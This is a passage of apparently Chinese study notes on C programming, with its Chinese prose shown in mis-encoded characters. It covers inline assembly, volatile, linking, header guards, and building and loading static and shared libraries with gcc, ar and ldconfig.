class="code"><pre><code class="hljs twig"><span class="language-xml">u = </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">513</span>, <span class="hljs-number">17</span>, <span class="hljs-number">129</span>, <span class="hljs-number">0</span>x<span class="hljs-number">81</span> &#125;&#125;</span><span class="language-xml"> ;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ C99 çš„ Memberwise åˆå§‹åŒ–è¯­æ³•, åˆ™å¯ä»¥åˆå§‹åŒ–è”åˆä½“çš„ä»»æ„ä¸€ä¸ªæˆå‘˜:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">demo_type</span> = &#123; .byte = &#123;<span class="hljs-number">0</span>x1b, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x24, <span class="hljs-number">0</span>x10, <span class="hljs-number">0</span>x81, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125; &#125;;<br></code></pre></td></tr></table></figure><p>ABI (Application Binary Interface), åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ¥å£è§„èŒƒ.</p><p>å¦‚æœä¸¤ä¸ªå¹³å°å…·æœ‰ç›¸åŒçš„ä½“ç³»ç»“æ„, å¹¶ä¸”éµå¾ªç›¸åŒçš„ ABI, å°±å¯ä»¥ä¿è¯ä¸€ä¸ªå¹³å°ä¸Šçš„äºŒè¿›åˆ¶ç¨‹åºç›´æ¥å¤åˆ¶åˆ°å¦ä¸€ä¸ªå¹³å°å°±èƒ½è¿è¡Œ.</p><h2 id="18-5-C-å†…è”æ±‡ç¼–"><a href="#18-5-C-å†…è”æ±‡ç¼–" class="headerlink" title="18.5 C å†…è”æ±‡ç¼–"></a>18.5 C å†…è”æ±‡ç¼–</h2><p>gcc æä¾›äº†ä¸€ç§æ‰©å±•è¯­æ³•å¯ä»¥åœ¨ C ä»£ç ä¸­ä½¿ç”¨å†…è”æ±‡ç¼– (Inline Assembly). æœ€ç®€å•çš„æ ¼å¼:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__asm__</span>(<span class="hljs-string">&quot;assembly code&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>__</code> æ˜¯ä¸¤ä¸ªä¸‹åˆ’çº¿.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__asm__(<span class="hljs-string">&quot;nop&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>nop</code> è®© CPU ç©ºè½¬ä¸€ä¸ªæŒ‡ä»¤æ‰§è¡Œå‘¨æœŸ.</p><p>æ‰§è¡Œå¤šæ¡æ±‡ç¼–æŒ‡ä»¤, åº”è¯¥ç”¨ <code>\n\t</code> å°†å„æ¡æŒ‡ä»¤åˆ†å‰²å¼€:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">__asm_<span class="hljs-number">_</span>(<span class="hljs-string">&quot;movl $1, %eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $4, %ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;int $0x80&quot;</span>);<br></code></pre></td></tr></table></figure><p>é€šå¸¸å†…è”æ±‡ç¼–éœ€è¦å’Œ C ä»£ç ä¸­çš„å˜é‡å»ºç«‹å…³è”, è¦ç”¨åˆ°å®Œæ•´çš„å†…è”æ±‡ç¼–æ ¼å¼:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">__asm__(assembler template<br>        : output operands               <span class="hljs-regexp">/* option */</span><br>        : input operands                <span class="hljs-regexp">/* option */</span><br>        : list of clobbered registers   <span class="hljs-regexp">/* option */</span><br>        );<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯æ±‡ç¼–æŒ‡ä»¤. </p><p>ç¬¬äºŒéƒ¨åˆ†å’Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯çº¦æŸæ¡ä»¶, ç¬¬äºŒéƒ¨åˆ†å‘Šè¯‰ç¼–è¯‘å™¨æ±‡ç¼–æŒ‡ä»¤çš„è¿ç®—ç»“æœè¦è¾“å‡ºåˆ°å“ªäº› C è¯­è¨€æ“ä½œæ•°ä¸­, è¿™äº›æ“ä½œæ•°åº”è¯¥æ˜¯å·¦å€¼è¡¨è¾¾å¼. ç¬¬ä¸‰éƒ¨åˆ†å‘Šè¯‰ç¼–è¯‘å™¨æ±‡ç¼–æŒ‡ä»¤éœ€è¦ä»å“ªäº› C è¯­è¨€æ“ä½œæ•°ä¸­è·å¾—è¾“å…¥.</p><p>ç¬¬å››éƒ¨åˆ†æ˜¯åœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­è¢«ä¿®æ”¹çš„å¯„å­˜å™¨åˆ—è¡¨. å‘Šè¯‰ç¼–è¯‘å™¨å“ªäº›å¯„å­˜å™¨çš„å€¼åœ¨æ‰§è¡Œè¿™æ¡ <code>__asm__</code> è¯­å¥æ—¶ä¼šæ”¹å˜. å¯é€‰éƒ¨åˆ†æœªå¡«å†™å°±åªå†™å†’å·.</p><p>gcc æ‰©å±•è¯­æ³•å¯ä»¥å‚è€ƒ <code>&lt;&lt;GCC online documentation&gt;&gt;</code></p><h2 id="18-6-volatile-é™å®šç¬¦"><a href="#18-6-volatile-é™å®šç¬¦" class="headerlink" title="18.6 volatile é™å®šç¬¦"></a>18.6 volatile é™å®šç¬¦</h2><p>ç¼–è¯‘å™¨åœ¨ä¼˜åŒ–æ—¶, å¯èƒ½æŠŠä¸è¯¥ä¼˜åŒ–çš„éƒ¨åˆ†ç»™ä¼˜åŒ–äº†, ä¸ºäº†é¿å…è¿™ç§æƒ…å†µ, ç”¨ volatile é™å®šç¬¦ä¿®é¥°å˜é‡, å°±æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨, å³ä½¿åœ¨ç¼–è¯‘æ—¶æŒ‡å®šäº†ä¼˜åŒ–é€‰é¡¹, æ¯æ¬¡è¯»å–è¿™ä¸ªå˜é‡æ—¶ä»ç„¶è¦ä»å†…å­˜è¯»å–, æ¯æ¬¡å†™è¿™ä¸ªå˜é‡ä¹Ÿä»è¦å†™ä¼šå†…å­˜.</p><p>åœ¨ä¸ºè°ƒè¯•è€Œç¼–è¯‘æ—¶ä¸è¦æŒ‡å®šä¼˜åŒ–é€‰é¡¹.</p><p>é€šå¸¸, æœ‰ Cache çš„å¹³å°éƒ½æœ‰åŠæ³•å¯¹æŸä¸€æ®µåœ°å€èŒƒå›´ç¦ç”¨ Cache.</p><p>MMU ä¸ä»…è¦åšåœ°å€è½¬æ¢å’Œè®¿é—®æƒé™æ£€æŸ¥, ä¹Ÿè¦é…åˆ Cache å·¥ä½œ.</p><p>é™¤äº†è®¾å¤‡å¯„å­˜å™¨éœ€è¦ç”¨ volatile é™å®šä¹‹å¤–, å½“ä¸€ä¸ªå…¨å±€å˜é‡è¢«åŒä¸€è¿›ç¨‹ä¸­çš„å¤šä¸ªæ§åˆ¶æµç¨‹è®¿é—®æ—¶ä¹Ÿè¦ç”¨ volatile é™å®š.</p><h1 id="ç¬¬19ç« -é“¾æ¥è¯¦è§£"><a href="#ç¬¬19ç« -é“¾æ¥è¯¦è§£" class="headerlink" title="ç¬¬19ç«  é“¾æ¥è¯¦è§£"></a>ç¬¬19ç«  é“¾æ¥è¯¦è§£</h1><p>ä¹¦ä¸­å†…å®¹: <code>putchar</code> æ˜¯ libc çš„åº“å‡½æ•°, åœ¨å¯æ‰§è¡Œæ–‡ä»¶ main ä¸­ä»ç„¶æ˜¯æœªå®šä¹‰çš„, è¦åœ¨ç¨‹åºè¿è¡Œæ—¶åšåŠ¨æ€é“¾æ¥.</p><p>å®é™…ä¸Šé“¾æ¥è¿‡ç¨‹æ˜¯ç”±ä¸€ä¸ªé“¾æ¥è„šæœ¬ (Linker Script) æ§åˆ¶çš„, é“¾æ¥è„šæœ¬å†³å®šäº†ç»™æ¯ä¸ªæ®µåˆ†é…ä»€ä¹ˆåœ°å€, å¦‚ä½•å¯¹é½, å“ªä¸ªæ®µåœ¨å‰, å“ªä¸ªæ®µåœ¨å, å“ªäº›æ®µåˆå¹¶åˆ°åŒä¸€ä¸ª Segment. å¦å¤–é“¾æ¥è„šæœ¬è¿˜è¦æŠŠä¸€äº›ç‰¹æ®Šåœ°å€å®šä¹‰æˆç¬¦å·.</p><p>å¦‚æœç”¨ ld è¿›è¡Œé“¾æ¥æ—¶æ²¡æœ‰é€šè¿‡ <code>-T</code> é€‰é¡¹æŒ‡å®šé“¾æ¥è„šæœ¬, åˆ™ä½¿ç”¨ ld çš„é»˜è®¤é“¾æ¥è„šæœ¬, é»˜è®¤é“¾æ¥è„šæœ¬å¯ä»¥ç”¨ <code>ld --verbose</code> å‘½ä»¤æŸ¥çœ‹.</p><p>è„šæœ¬çš„å…·ä½“è§£æè§ä¹¦. æ¨èå‚è€ƒä¸º <code>&lt;&lt;GNU Binutils Documentation&gt;&gt;</code>.</p><p>åœ¨ gdb å‘½ä»¤ä¸­æŒ‡å®šæŸä¸ª <code>.c</code> æ–‡ä»¶ä¸­çš„æŸä¸€è¡Œæˆ–æŸä¸ªå‡½æ•°, å¯ä»¥ç”¨ â€œæ–‡ä»¶å:è¡Œå·â€ æˆ– â€œæ–‡ä»¶å:å‡½æ•°åâ€ çš„è¯­æ³•:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(gdb) <span class="hljs-selector-tag">b</span> stack<span class="hljs-selector-class">.c</span>:<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h2 id="19-2-å®šä¹‰å’Œå£°æ˜"><a href="#19-2-å®šä¹‰å’Œå£°æ˜" class="headerlink" title="19.2 å®šä¹‰å’Œå£°æ˜"></a>19.2 å®šä¹‰å’Œå£°æ˜</h2><h3 id="19-2-1-extern-å’Œ-static-å…³é”®å­—"><a href="#19-2-1-extern-å’Œ-static-å…³é”®å­—" class="headerlink" title="19.2.1 extern å’Œ static å…³é”®å­—"></a>19.2.1 extern å’Œ static å…³é”®å­—</h3><p>å‡¡æ˜¯è¢«å¤šæ¬¡å£°æ˜çš„å˜é‡æˆ–å‡½æ•°, å¿…é¡»æœ‰ä¸”åªæœ‰ä¸€ä¸ªå£°æ˜æ˜¯å®šä¹‰, å¦‚æœæœ‰å¤šä¸ªå®šä¹‰, æˆ–è€…ä¸€ä¸ªå®šä¹‰éƒ½æ²¡æœ‰, é“¾æ¥å™¨å°±æ— æ³•å®Œæˆé“¾æ¥.</p><p>å˜é‡å£°æ˜å’Œå‡½æ•°å£°æ˜æœ‰ä¸€ç‚¹ä¸åŒ, å‡½æ•°å£°æ˜çš„ extern å…³é”®è¯å¯ä»¥çœç•¥, è€Œå˜é‡å£°æ˜å¦‚æœä¸å†™ extern åˆ™å«ä¹‰ä¸åŒ.</p><p>static å…³é”®è¯å¯ä»¥å®ç°å¯¹æ¨¡å—å†…éƒ¨çš„ä¿æŠ¤, ä¹Ÿæ˜¯ä¸€ç§å°è£….</p><h3 id="19-2-2-å¤´æ–‡ä»¶"><a href="#19-2-2-å¤´æ–‡ä»¶" class="headerlink" title="19.2.2 å¤´æ–‡ä»¶"></a>19.2.2 å¤´æ–‡ä»¶</h3><p>ç³»ç»Ÿçš„å¤´æ–‡ä»¶ç›®å½•çš„é¡ºåºæŸ¥æ‰¾, åœ¨ archlinux ä¸Šä¸º <code>/usr/local/include</code>, <code>/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.0/include/</code>, <code>/usr/include</code>.</p><p><code>-I</code> é€‰é¡¹å‘Šè¯‰ gcc å¤´æ–‡ä»¶è¦åˆ°å“ªé‡Œå»æ‰¾.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> STACK_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>è¿™ç§ä¿æŠ¤å¤´æ–‡ä»¶çš„å†™æ³•ç§°ä¸º Header Guard.</p><p>é‡å¤åŒ…å«å¤´æ–‡ä»¶çš„é—®é¢˜:</p><ul><li>é¢„å¤„ç†å’Œç¼–è¯‘çš„é€Ÿåº¦å˜æ…¢</li><li>å¯èƒ½é™·å…¥æ­»å¾ªç¯</li><li>å¤´æ–‡ä»¶é‡Œæœ‰äº›ä»£ç ä¸å…è®¸é‡å¤å‡ºç°, å¦‚ç”¨ typedef å®šä¹‰ä¸€ä¸ªç±»å‹å, åœ¨ä¸€ä¸ªç¼–è¯‘å•å…ƒä¸­åªå…è®¸å®šä¹‰ä¸€æ¬¡.</li></ul><p>å†™ <code>.c</code> æ–‡ä»¶å’Œå¤´æ–‡ä»¶æ—¶ä¸€èˆ¬æ¥è¯´åº”éµå¾ªä»¥ä¸‹è§„åˆ™:</p><ul><li><code>.c</code> æ–‡ä»¶ä¸­å¯ä»¥æœ‰å˜é‡æˆ–å‡½æ•°å®šä¹‰, è€Œ <code>.h</code> æ–‡ä»¶ä¸­åº”è¯¥åªæœ‰å˜é‡æˆ–å‡½æ•°å£°æ˜è€Œæ²¡æœ‰å®šä¹‰.</li><li>ä¸è¦æŠŠä¸€ä¸ª <code>.c</code> æ–‡ä»¶åŒ…å«åˆ°å¦ä¸€ä¸ª <code>.c</code> æ–‡ä»¶ä¸­</li></ul><h3 id="19-2-3-å®šä¹‰å’Œå£°æ˜çš„è¯¦ç»†è§„åˆ™"><a href="#19-2-3-å®šä¹‰å’Œå£°æ˜çš„è¯¦ç»†è§„åˆ™" class="headerlink" title="19.2.3 å®šä¹‰å’Œå£°æ˜çš„è¯¦ç»†è§„åˆ™"></a>19.2.3 å®šä¹‰å’Œå£°æ˜çš„è¯¦ç»†è§„åˆ™</h3><p>åœ¨å—ä½œç”¨åŸŸä¸­ä¸å…è®¸ç”¨ static å…³é”®å­—å£°æ˜å‡½æ•°.</p><p>Tentative Definition æ˜¯æŒ‡, ä¸€ä¸ªå˜é‡å£°æ˜å…·æœ‰æ–‡ä»¶ä½œç”¨åŸŸ, æ²¡æœ‰åˆå§‹åŒ–, ä¹Ÿæ²¡æœ‰ç”¨ Storage Class å…³é”®å­—ä¿®é¥°, æˆ–è€…ç”¨ static å…³é”®å­—ä¿®é¥°, é‚£ä¹ˆç¼–è¯‘å™¨è®¤ä¸ºè¿™ä¸ªå˜é‡æ˜¯åœ¨è¯¥ç¼–è¯‘å•å…ƒä¸­å®šä¹‰çš„, ä½†åˆå§‹å€¼ç‰¹å®š, ç„¶åç»§ç»­ç¼–è¯‘ä¸‹é¢çš„ä»£ç , åˆ°æ•´ä¸ªå•å…ƒç¼–è¯‘ç»“æŸæ—¶å¦‚æœæ²¡æœ‰é‡åˆ°è¿™ä¸ªå˜é‡å¸¦åˆå§‹åŒ–çš„å®šä¹‰, å°±å°†å…¶åˆå§‹åŒ–ä¸º 0.</p><p>C99 å¯¹ Tentative Definition çš„å¤„ç†æ˜¯åœ¨ç¼–è¯‘ä¸€ä¸ªå•å…ƒæ—¶è¿›è¡Œçš„, è€Œ gcc æ˜¯æ¨è¿Ÿåˆ°é“¾æ¥æ—¶æ‰åš.</p><h2 id="19-3-é™æ€åº“"><a href="#19-3-é™æ€åº“" class="headerlink" title="19.3 é™æ€åº“"></a>19.3 é™æ€åº“</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ar rs libstack<span class="hljs-selector-class">.a</span> stack<span class="hljs-selector-class">.o</span> push<span class="hljs-selector-class">.o</span> pop<span class="hljs-selector-class">.o</span> is_empty<span class="hljs-selector-class">.o</span><br>ar: creating libstak.a<br></code></pre></td></tr></table></figure><p>åº“æ–‡ä»¶åéƒ½æ˜¯ä»¥ lib å¼€å¤´çš„, é™æ€åº“ä»¥ <code>.a</code> ä½œä¸ºåç¼€, è¡¨ç¤º Archive.</p><p>ar å‘½ä»¤ç±»ä¼¼äº tar å‘½ä»¤, ä¹Ÿæ˜¯ç”¨æ¥æ‰“åŒ…çš„, ä½†æ˜¯æŠŠç›®æ ‡æ–‡ä»¶æ‰“åŒ…æˆé™æ€åº“çš„æ ¼å¼åªèƒ½ç”¨ ar å‘½ä»¤è€Œä¸èƒ½ç”¨ tar å‘½ä»¤.</p><p><code>r</code> é€‰é¡¹ (replacement) è¡¨ç¤ºå°†åé¢çš„ç›®æ ‡æ–‡ä»¶åˆ—è¡¨æ·»åŠ åˆ°æ–‡ä»¶åŒ… libstack.a ä¸­, å¦‚æœ libstack.a ä¸å­˜åœ¨å°±åˆ›å»ºå®ƒ, å¦‚æœ libstack.a ä¸­å·²æœ‰åŒåçš„ç›®æ ‡æ–‡ä»¶å°±æ›¿æ¢æˆæ–°çš„.</p><p><code>s</code> é€‰é¡¹è¡¨ç¤ºä¸ºé™æ€åº“åˆ›å»ºç´¢å¼•, è¿™ä¸ªç´¢å¼•è¢«é“¾æ¥å™¨ä½¿ç”¨, ranlib å‘½ä»¤ä¹Ÿå¯ä»¥ä¸ºé™æ€åº“åˆ›å»ºç´¢å¼•, ä»¥ä¸‹ç­‰ä»·:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ar r libstack<span class="hljs-selector-class">.a</span> stack<span class="hljs-selector-class">.o</span> push<span class="hljs-selector-class">.o</span> pop<span class="hljs-selector-class">.o</span> is_empty<span class="hljs-selector-class">.o</span><br>$ ranlib libstack.a<br></code></pre></td></tr></table></figure><p>å°† libstack.a å’Œ main.c ç¼–è¯‘é“¾æ¥åœ¨ä¸€èµ·:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> -L. -lstack -Istack -o <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p><code>-L</code> é€‰é¡¹å‘Šè¯‰ç¼–è¯‘å™¨å»å“ªé‡Œæ‰¾éœ€è¦çš„åº“æ–‡ä»¶. <code>-I</code> é€‰é¡¹å‘Šè¯‰ç¼–è¯‘å™¨å»å“ªé‡Œç…§å¤´æ–‡ä»¶.</p><p>å¯ä»¥ç”¨ <code>-print-search-dirs</code> é€‰é¡¹æ¥æŸ¥çœ‹ç¼–è¯‘å™¨é»˜è®¤æŸ¥æ‰¾çš„ç›®å½•.</p><p>gcc åœ¨é“¾æ¥æ—¶ä¼˜å…ˆè€ƒè™‘å…±äº«åº“, å…¶æ¬¡æ‰æ˜¯é™æ€åº“. å¦‚æœå¸Œæœ› gcc ä¹‹è€ƒè™‘é™æ€åº“, å¯ä»¥æŒ‡å®š <code>-static</code> é€‰é¡¹.</p><p>é“¾æ¥å…±äº«åº“å’Œé“¾æ¥é™æ€åº“çš„åŒºåˆ«:</p><ul><li>é“¾æ¥å…±äº«åº“æ—¶, é“¾æ¥å™¨åªæ˜¯ç¡®è®¤äº†å¯æ‰§è¡Œæ–‡ä»¶ä¸­åº”ç”¨çš„æŸäº›ç¬¦å·æ˜¯å¦æœ‰å®šä¹‰, å¹¶æ²¡æœ‰æœ€ç»ˆç¡®å®šè¿™äº›ç¬¦å·çš„åœ°å€, è¿™äº›ç¬¦å·åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä»ç„¶æ˜¯æœªå®šä¹‰ç¬¦å·, è¦åœ¨è¿è¡Œæ—¶åšåŠ¨æ€é“¾æ¥</li><li>é“¾æ¥é™æ€åº“æ—¶, é“¾æ¥å™¨ä¼šæŠŠé™æ€åº“ä¸­çš„ç›®æ ‡æ–‡ä»¶å–å‡ºæ¥å’Œå¯æ‰§è¡Œæ–‡ä»¶çœŸæ­£é“¾æ¥åœ¨ä¸€èµ·.</li></ul><p>ä½¿ç”¨é™æ€åº“çš„ä¸€ä¸ªå¥½å¤„: é“¾æ¥å™¨ä»é™æ€åº“ä¸­åªå–å‡ºéœ€è¦çš„ç›®æ ‡æ–‡ä»¶æ¥åšé“¾æ¥, ä¸éœ€è¦çš„ç›®æ ‡æ–‡ä»¶å¯ä»¥ä¸é“¾æ¥.</p><p>å¦ä¸€ä¸ªå¥½å¤„æ˜¯: åªéœ€å†™ä¸€ä¸ªåº“æ–‡ä»¶å, è€Œä¸éœ€è¦å†™ä¸€é•¿ä¸²ç›®æ ‡æ–‡ä»¶å.</p><h2 id="19-4-å…±äº«åº“"><a href="#19-4-å…±äº«åº“" class="headerlink" title="19.4 å…±äº«åº“"></a>19.4 å…±äº«åº“</h2><h3 id="19-4-1-ç¼–è¯‘-é“¾æ¥-è¿è¡Œ"><a href="#19-4-1-ç¼–è¯‘-é“¾æ¥-è¿è¡Œ" class="headerlink" title="19.4.1 ç¼–è¯‘, é“¾æ¥. è¿è¡Œ"></a>19.4.1 ç¼–è¯‘, é“¾æ¥. è¿è¡Œ</h3><p>ç»„æˆå…±äº«åº“çš„ç›®æ ‡æ–‡ä»¶å’Œä¸€èˆ¬çš„ç›®æ ‡æ–‡ä»¶æœ‰æ‰€ä¸åŒ, åœ¨ç¼–è¯‘æ—¶è¦åŠ  <code>-fPIC</code> é€‰é¡¹:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$ gcc -c -fPIC stack/stack.c stack/push.c stack/pop.c stack/is_empty.c<br></code></pre></td></tr></table></figure><p><code>-f</code> åé¢è·Ÿä¸€äº›ç¼–è¯‘é€‰é¡¹, <code>PIC</code> æ˜¯å…¶ä¸­ä¸€ç§, è¡¨ç¤ºç”Ÿæˆä½ç½®æ— å…³ä»£ç  (Position Independent Code).</p><p>åæ±‡ç¼–è¯­å¥ä¸­ä¸€èˆ¬ä¼šæœ‰ <code>sub $0x4,%esp</code> è¿™ä¸€å¥, è¿™æ˜¯åœ¨å¼€è¾Ÿæ ˆç©ºé—´, è¿™é‡Œçš„ <code>$0x4</code> è¡¨ç¤ºæœ‰ç”¨äº† 4 å­—èŠ‚çš„å±€éƒ¨å˜é‡, å³, ç§»åŠ¨æ ˆé¡¶æŒ‡é’ˆ esp, ç»™è¢«è°ƒç”¨å‡½æ•°å¼€è¾Ÿæ ˆå¸§. åé¢çš„ä¸€å¥ <code>mov 0x8(%ebp),%eax</code> æ˜¯æŠŠä¼ è¿›æ¥çš„å‚æ•°å€¼èµ‹ç»™ eax.</p><p>ç¼–è¯‘ç”Ÿæˆå…±äº«åº“:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ gcc -shared -o libstack<span class="hljs-selector-class">.so</span> stack<span class="hljs-selector-class">.o</span> push<span class="hljs-selector-class">.o</span> pop<span class="hljs-selector-class">.o</span> is_empty<span class="hljs-selector-class">.o</span> <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-shared</code> é€‰é¡¹, å¹¶ç”¨ <code>-o</code> æŒ‡å®šæ–‡ä»¶å.</p><p>å…±äº«åº“ä¸­å„æ®µçš„åŠ è½½åœ°å€å¹¶æ²¡æœ‰å®šæ­», å¯ä»¥åŠ è½½åˆ°ä»»æ„ä½ç½®, å› ä¸ºæŒ‡ä»¤ä¸­çš„åœ°å€éƒ½æ˜¯ç›¸å¯¹äº <code>ebx</code>çš„.</p><p><code>lea</code> æŒ‡ä»¤ç®—å‡ºç¬¬ä¸€ä¸ªæ“ä½œä¹¦æ‰€ä»£è¡¨çš„åœ°å€, ä½†ä¸è®¿é—®å†…å­˜, è€Œæ˜¯ç›´æ¥æŠŠè¿™ä¸ªåœ°å€ä¼ ç»™ç¬¬äºŒä¸ªæ“ä½œæ•°.</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">lea <span class="hljs-number">0</span>x1(<span class="hljs-built_in">%eax</span>),<span class="hljs-built_in">%edx</span><br></code></pre></td></tr></table></figure><p>ç¨‹åºç¼–è¯‘æ—¶å¯»æ‰¾å…±äº«åº“çš„è·¯å¾„å’Œè¿è¡Œæ—¶çš„å¯»æ‰¾è·¯å¾„ä¸åŒ.</p><p>åˆ©ç”¨ <code>ldd</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¾èµ–äºå“ªäº›å…±äº«åº“. <code>ldd</code> å‘½ä»¤ä¼šæ¨¡æ‹Ÿè¿è¡Œä¸€è¾¹ç¨‹åº, åœ¨è¿è¡Œè¿‡ç¨‹ä¸­åšåŠ¨æ€é“¾æ¥, ä»è€Œå¾—çŸ¥è¿™ä¸ªç¨‹åºä¾èµ–äºå“ªäº›å…±äº«åº“ä»¥åŠè¿™äº›å…±äº«åº“éƒ½åœ¨ä»€ä¹ˆè·¯å¾„ä¸‹.</p><p>gcc è°ƒç”¨ ld åšé“¾æ¥æ—¶ç”¨ <code>-dynamic-linker /lib/ld-linux.so.2</code> é€‰é¡¹æŒ‡å®šåŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„, åŠ¨æ€é“¾æ¥å™¨ä¹Ÿåƒå…¶ä»–å…±äº«åº“ä¸€æ ·åŠ è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­.</p><p>å…±äº«åº“çš„è·¯å¾„éœ€è¦åœ¨è¿è¡Œæ—¶ç”±åŠ¨æ€é“¾æ¥å™¨ <code>/lib/ld-linux.so.2</code> å»æŸ¥æ‰¾.</p><p>ä» ld.so(8) ä¸­å¯ä»¥æŸ¥åˆ°å…±äº«åº“è·¯å¾„çš„æœç´¢é¡ºåº. å…·ä½“è§ä¹¦.</p><p>ç¯å¢ƒå˜é‡ (Environment Variable) æ˜¯è¿›ç¨‹è¿è¡Œæ—¶ä¿å­˜åœ¨å†…å­˜ä¸­çš„ä¸€ç»„å­—ç¬¦ä¸², æ¯ä¸ªå­—ç¬¦ä¸²éƒ½æ˜¯ â€œkey&#x3D;valueâ€ çš„å½¢å¼, key æ˜¯å˜é‡å, value æ˜¯å˜é‡çš„å€¼.</p><p>åœ¨åˆ›å»ºè¿›ç¨‹æ˜¯å¯ä»¥ä¼ é€’ç¯å¢ƒå˜é‡, å¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">LD_LIBRARY_PATH=<span class="hljs-regexp">/home/</span>akaedu<span class="hljs-regexp">/testdir ./m</span>ain<br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ <code>/etc/ld.so.conf</code> ä¿å­˜å…±äº«åº“è·¯å¾„, æ·»åŠ åéœ€è¦æ‰§è¡Œ <code>ldconfig</code> å‘½ä»¤:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo ldconfig -v<br></code></pre></td></tr></table></figure><h3 id="19-4-2-å‡½æ•°çš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹"><a href="#19-4-2-å‡½æ•°çš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹" class="headerlink" title="19.4.2 å‡½æ•°çš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹"></a>19.4.2 å‡½æ•°çš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹</h3><p><code>.plt</code> æ®µ, PLT æ˜¯ Procedure Linkage Table çš„ç¼©å†™. <code>.plt</code> æ®µé‡Œä¿å­˜çš„ä¹Ÿæ˜¯æŒ‡ä»¤, å’Œ <code>.text</code> ä¸€èµ·åˆå¹¶åˆ° Text Segment.</p><p>åŠ¨æ€é“¾æ¥å™¨åˆ©ç”¨ Globle Offset Table çš„è¡¨é¡¹ä¿å­˜å…±äº«åº“ä¸­ç¬¦å·çš„ç»å¯¹åœ°å€, é“¾æ¥å®Œæˆå, é€šè¿‡ Globle Offset Table çš„è¡¨é¡¹é—´æ¥å¯»å€å³å¯è®¿é—®å…±äº«åº“ä¸­çš„ç¬¦å·.</p><h3 id="19-4-3-å…±äº«åº“çš„å‘½åæƒ¯ä¾‹"><a href="#19-4-3-å…±äº«åº“çš„å‘½åæƒ¯ä¾‹" class="headerlink" title="19.4.3 å…±äº«åº“çš„å‘½åæƒ¯ä¾‹"></a>19.4.3 å…±äº«åº“çš„å‘½åæƒ¯ä¾‹</h3><p>æ¯ä¸ªå…±äº«åº“æœ‰ä¸‰ä¸ªæ–‡ä»¶å:</p><ul><li>real name</li><li>soname</li><li>linker name</li></ul><p>çœŸæ­£çš„åº“æ–‡ä»¶çš„åå­—æ˜¯ real name, åŒ…å«å®Œæ•´çš„å…±äº«åº“ç‰ˆæœ¬å·, å¦‚: libcap.so.1.10</p><p>soname æ˜¯ç¬¦å·é“¾æ¥çš„åå­—, åªåŒ…å«å…±äº«åº“çš„ä¸»ç‰ˆæœ¬å·. 